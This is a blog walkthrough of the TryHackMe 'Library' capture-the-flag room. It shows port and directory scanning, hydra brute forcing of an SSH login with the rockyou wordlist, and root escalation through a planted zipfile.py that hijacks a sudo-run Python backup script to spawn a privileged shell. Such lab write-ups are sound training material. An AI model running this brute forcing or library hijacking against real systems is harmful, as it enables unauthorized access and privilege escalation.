---
layout: post
title: TryHackMe Walkthrough - Library
date: 2021-07-03
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Easy
permalink: /2021/07/Library
img: 2021/07/Library/Library.jpeg
---

This is an easy room where you have to brute force your way in. Then exploit a python script to get root.

* Room: Library
* Difficulty: Easy
* URL: [https://tryhackme.com/room/bsidesgtlibrary](https://tryhackme.com/room/bsidesgtlibrary)
* Author: [stuxnet](https://tryhackme.com/p/stuxnet)

```
boot2root machine for FIT and bsides guatemala CTF
```

## Enumeration

I started the machine by looking at opened ports.

```bash
$ rustscan -a target
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.146.46:22
Open 10.10.146.46:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-02 15:14 EDT
Initiating Ping Scan at 15:14
Scanning 10.10.146.46 [2 ports]
Completed Ping Scan at 15:14, 0.23s elapsed (1 total hosts)
Initiating Connect Scan at 15:14
Scanning target (10.10.146.46) [2 ports]
Discovered open port 80/tcp on 10.10.146.46
Discovered open port 22/tcp on 10.10.146.46
Completed Connect Scan at 15:14, 0.24s elapsed (2 total ports)
Nmap scan report for target (10.10.146.46)
Host is up, received syn-ack (0.24s latency).
Scanned at 2021-07-02 15:14:39 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

Port 22 (SSH) and 80 (HTTP) are opened. So I opened Burp and Firefox to look at the web site.

## Web Site

The web site is very simple. It contains only one static page.

![Main Site](/assets/images/2021/07/Library/01_MainSite.png "Main Site")

There are some links, but they don't take you anywhere. And the form at the bottom of the page doesn't do anything either.

There is a 'robots.txt' file, but it doen's contain much.

```
User-agent: rockyou
Disallow: /
```

I thought that maybe 'rockyou' was a clue so I kept it in mind while enumerating the site.

Next, I tried looking for hidden pages on the web site. 

```
$ gobuster dir -e -u http://target.thm/ -xphp,txt -t30 -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/07/02 15:27:10 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.htaccess.txt        (Status: 403) [Size: 298]
http://target.thm/.hta.txt             (Status: 403) [Size: 293]
http://target.thm/.htpasswd            (Status: 403) [Size: 294]
http://target.thm/.htaccess            (Status: 403) [Size: 294]
http://target.thm/.htpasswd.php        (Status: 403) [Size: 298]
http://target.thm/.hta                 (Status: 403) [Size: 289]
http://target.thm/.htaccess.php        (Status: 403) [Size: 298]
http://target.thm/.htpasswd.txt        (Status: 403) [Size: 298]
http://target.thm/.hta.php             (Status: 403) [Size: 293]
http://target.thm/images               (Status: 301) [Size: 309] [--> http://target.thm/images/]
http://target.thm/index.html           (Status: 200) [Size: 5439]
http://target.thm/robots.txt           (Status: 200) [Size: 33]
http://target.thm/robots.txt           (Status: 200) [Size: 33]
http://target.thm/server-status        (Status: 403) [Size: 298]

===============================================================
2021/07/02 15:29:00 Finished
===============================================================
```

Gobuster did not find anything, so I tried it again, but this time using rockyou as the user-agent. 

```bash
$ gobuster dir -e -u http://target.thm/ -xphp,txt -t30 -H 'User-Agent:rockyou' -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/07/02 15:35:49 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.htaccess            (Status: 403) [Size: 294]
http://target.thm/.hta                 (Status: 403) [Size: 289]
http://target.thm/.htpasswd            (Status: 403) [Size: 294]
http://target.thm/.htaccess.php        (Status: 403) [Size: 298]
http://target.thm/.hta.php             (Status: 403) [Size: 293]
http://target.thm/.htpasswd.php        (Status: 403) [Size: 298]
http://target.thm/.htaccess.txt        (Status: 403) [Size: 298]
http://target.thm/.hta.txt             (Status: 403) [Size: 293]
http://target.thm/.htpasswd.txt        (Status: 403) [Size: 298]
http://target.thm/images               (Status: 301) [Size: 309] [--> http://target.thm/images/]
http://target.thm/index.html           (Status: 200) [Size: 5439]
http://target.thm/robots.txt           (Status: 200) [Size: 33]
http://target.thm/robots.txt           (Status: 200) [Size: 33]
http://target.thm/server-status        (Status: 403) [Size: 298]

===============================================================
2021/07/02 15:37:40 Finished
===============================================================

```

Still nothing. 


## Getting access

The web site had a post written by a 'meliodas'. I could not try that as a username anywhere on the site. So I decided to use it to try to brute force the ssh login. Of course, I used rockyou as the word list. 

```bash
$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t32 target ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-02 15:49:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344402 login tries (l:1/p:14344402), ~448263 tries per task
[DATA] attacking ssh://target:22/
[22][ssh] host: target   login: meliodas   password: REDACTED
[STATUS] attack finished for target (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-02 15:50:30
```

It only took one minute to find the password. I then used it to connect to the server and get the first flag.

```bash
$ ssh meliodas@target
The authenticity of host 'target (10.10.146.46)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target,10.10.146.46' (ECDSA) to the list of known hosts.
meliodas@target's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118

meliodas@ubuntu:~$ ls
bak.py  user.txt

meliodas@ubuntu:~$ cat user.txt
REDACTED
```

## Getting root

Now I needed to get root. I checked if meliodas could run sudo. They were allowed to run a python script as any user. 

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
	
meliodas@ubuntu:~$ ls -l bak.py
-rw-r--r-- 1 root root 353 Aug 23  2019 bak.py
```

The file was not writable, so I check what it did. 

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

It did a backup of the website, using a library called zipfile. So I created a file called `zipfile.py` to see if it would be included when I ran the script.

```python
import subprocess

ZIP_DEFLATED = 1

def ZipFile(a, b, c):
        process = subprocess.Popen('/bin/bash -p', shell=True, stdout=subprocess.PIPE)
        for line in process.stdout:
                print(line)
        process.wait()
```

And it worked. I ran the backup script with sudo, and my script launched bash when the script tried to instantiate the ZipFile object. 

```bash
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py

root@ubuntu:~# whoami
b'root\n'

root@ubuntu:~# cat /root/root.txt
REDACTED
```